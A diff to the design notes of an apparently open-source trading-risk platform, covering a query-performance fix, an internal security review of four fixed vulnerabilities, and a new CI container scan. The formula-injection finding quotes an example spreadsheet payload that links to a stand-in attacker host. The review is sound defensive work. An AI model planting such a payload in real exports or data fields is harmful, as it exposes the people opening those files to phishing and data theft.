@@ -595,15 +595,24 @@ and numbers. Summary of what changed:
   methods are comfortably sub-50ms at realistic scale (`PERFORMANCE.md`) — the
   P1-7 Decimal-arithmetic rewrite didn't introduce a meaningful regression, and the
   quant computation itself was never the bottleneck.
-- **Identified, not fixed**: at 15,000 live trades in a single portfolio-wide query,
-  ORM object hydration (`Trade.counterparty`/`.book` are `lazy="joined"`, so every
-  row pulls in two more tables even when the caller only needs trade economics)
-  dominates wall-clock time far more than the query/index itself (see
-  `PERFORMANCE.md`'s `COUNT(*)`-vs-hydrated comparison: 6ms vs. 1.2-1.4s for the
-  identical predicate). Not fixed here — it's a real, separable optimization (a
-  leaner projection query for risk/valuation callers that don't need the full
-  `TradeRead` shape) that shouldn't be spec'd out speculatively without a concrete
-  caller reaching this scale. Tracked in `FUTURE_WORK.md`.
+- **Identified, then partially fixed (task P1-13)**: at 15,000 live trades in a
+  single portfolio-wide query, ORM object hydration was found to dominate
+  wall-clock time far more than the query/index itself (`PERFORMANCE.md`'s
+  `COUNT(*)`-vs-hydrated comparison: 6ms vs. 1.2-1.4s for the identical predicate).
+  Most of that gap was `Trade.counterparty`/`.book`'s model-level `lazy="joined"`
+  eager-joining two more tables on every row, even though every caller of
+  `TradeRepository.list_live` (valuation's position-building, risk's trade
+  fetches, trade_capture's pre-trade limit checks) only ever needs trade
+  economics, never the counterparty's name or book's description.
+  `TradeRepository.list_live` now overrides that with `lazyload` for this query
+  specifically — `TradeRepository.list`/`.get` (the trade-blotter/detail-view
+  methods, which DO need those names for `TradeRead`) are unaffected. Measured
+  effect: 1.2-1.4s → 770-805ms at the same 15,000-row scale, roughly a 40%
+  reduction (see `PERFORMANCE.md` for the full before/after and what's still
+  unclosed — the remaining gap is inherent SQLAlchemy ORM-object-construction
+  cost, not a join, and closing it further would mean a column-level projection
+  instead of full `Trade` hydration, a larger change tracked in
+  `FUTURE_WORK.md` rather than done speculatively here too).
 
 `market_data_points`' Timescale hypertable (see "Chosen stack") has no compression
 or retention policy configured — a bare hypertable with Timescale's default 7-day
@@ -681,8 +690,63 @@ short-TTL or ephemeral operational state, never a system of record.
 None of this is a substitute for an actual third-party security review before this
 platform handles real trading data — see `FUTURE_WORK.md`'s item 13 for exactly
 what's still open (production-scale RTO, cross-server restore, WAL-archiving/PITR
-infrastructure, container image CVE scanning, the dev-tooling Vite major-version
-bump) and why each was deferred rather than rushed.
+infrastructure, the dev-tooling Vite major-version bump) and why each was deferred
+rather than rushed.
+
+### Internal security-review pass
+
+A follow-up to the section above, deliberately scoped as what it actually is: an
+internal review against a known checklist, not a third-party audit (see that
+section's closing note). Reviewed this branch's full diff against `main` for
+concrete, exploitable vulnerabilities — not a style pass, not a best-practices
+survey. Four real findings, all fixed with a regression test proving both the
+vulnerability and the fix:
+
+- **`GET /audit/{entity_type}/{entity_id}` had no book-entitlement check at all**
+  (HIGH). Every other book-scoped surface (trade_capture, valuation, risk, limits,
+  export) enforces `EntitlementService.assert_can_access_book`; this endpoint
+  predates that feature and was never updated when it shipped. Audit entries carry
+  a full before/after trade-economics snapshot (`TradeCaptureService
+  ._trade_snapshot`), so any authenticated user who obtained a `trade_id` could
+  read a walled-off desk's economics straight through the audit trail, bypassing
+  entitlements everywhere else enforce. Fixed in `AuditService._assert_can_view`:
+  resolves the entity's `book_id` (today, `Trade` or `LimitBreach` — the only two
+  audited entity types) and checks it before returning history; an entity type it
+  doesn't know how to resolve fails closed to ADMIN-only rather than silently
+  allowing. See `test_entitlements.py::test_outsider_cannot_read_audit_history_of_a_trade_in_a_walled_book`.
+- **Three risk-result-by-id endpoints had the identical gap** (MEDIUM): `GET
+  /risk/var/{id}`, `GET /risk/stress/{id}`, `GET /risk/options/greeks/{id}` fetched
+  the row directly and returned it, checked only for *authentication*, not book
+  entitlement — unlike the write/compute endpoints that produce those same rows
+  (`run_var`, `run_stress_test`, `compute_option_greeks`), which all correctly call
+  `assert_can_access_book`. A results *id* is far easier to end up holding than a
+  *trade* id (it's in every response from the compute endpoint, shareable links,
+  browser history), making this a realistic path to another desk's VaR/stress/
+  greeks. Fixed with three new `RiskService` methods
+  (`get_var_result`/`get_stress_result`/`get_option_greeks_result`) that load-then-
+  entitlement-check, reusing the same `_assert_can_access_risk_scope` the write
+  endpoints already use (handles `VarResult.book_id`'s nullable portfolio-wide case
+  correctly). See the three `test_outsider_cannot_read_a_*_result_for_a_walled_book_by_id`
+  tests.
+- **CSV export was vulnerable to formula injection** (MEDIUM). `Counterparty.name`/
+  `Book.name` are free text with no length or pattern constraint
+  (`CounterpartyCreate`/`BookCreate`), settable by any TRADER, and flowed verbatim
+  into `GET /export/trades?format=csv` cells via `pandas.DataFrame.to_csv`. A name
+  like `=HYPERLINK("http://attacker.example/steal","Click")` executes as a formula
+  the moment an ADMIN/RISK_MANAGER opens the exported CSV in Excel/Sheets — a
+  newly-reachable attack surface because this PR is what added the export feature.
+  Fixed in `export/serialization.py`: any string cell starting with `=`, `+`, `-`,
+  `@`, tab, or CR gets a leading `'` prefix before the CSV is written (the standard
+  mitigation — spreadsheet apps render a leading `'` as "this cell is literal
+  text," never executing what follows). JSON/Parquet exports are untouched;
+  neither is opened by a spreadsheet app, so neither has this exposure. See
+  `test_export.py::test_export_trades_csv_neutralizes_formula_injection_in_free_text_fields`.
+- **`/health/ready` echoed the raw exception string** to an unauthenticated caller
+  on a database/Redis failure (LOW) — internal hostnames/ports/driver error text,
+  useful reconnaissance during a real outage. Fixed: the response body now reports
+  only `"ok"`/`"error"` per dependency; the full exception still goes to the
+  server-side log (`logger.warning`), just not to an anonymous caller. See
+  `test_observability.py::test_readiness_never_leaks_the_raw_exception_to_an_unauthenticated_caller`.
 
 ## CI
 
@@ -705,7 +769,13 @@ bump) and why each was deferred rather than rushed.
 - `docker-build`: builds `backend/Dockerfile` and both frontend images
   (`frontend/Dockerfile`, the production nginx build, and `Dockerfile.dev`, the
   docker-compose dev-server image) — a broken Dockerfile fails here, not on first
-  real deploy.
+  real deploy. Also Trivy-scans the two production images (`openetrm-api`,
+  `openetrm-web`) for CRITICAL/HIGH OS-package CVEs with `ignore-unfixed: true` —
+  `pip-audit`/`npm audit` (the `dependency-audit` job) only see *source*
+  dependencies, not vulnerabilities baked into the base images themselves. Could
+  not be validated locally (this sandbox has no Docker daemon and no network
+  access to third-party GitHub repos to fetch the Trivy binary directly), so its
+  first real proof is this job's own CI run.
 - `dependency-audit`: `pip-audit` (backend) + `npm audit --omit=dev` (frontend
   production dependencies) — see "Production operability, DR, and security
   review" above.
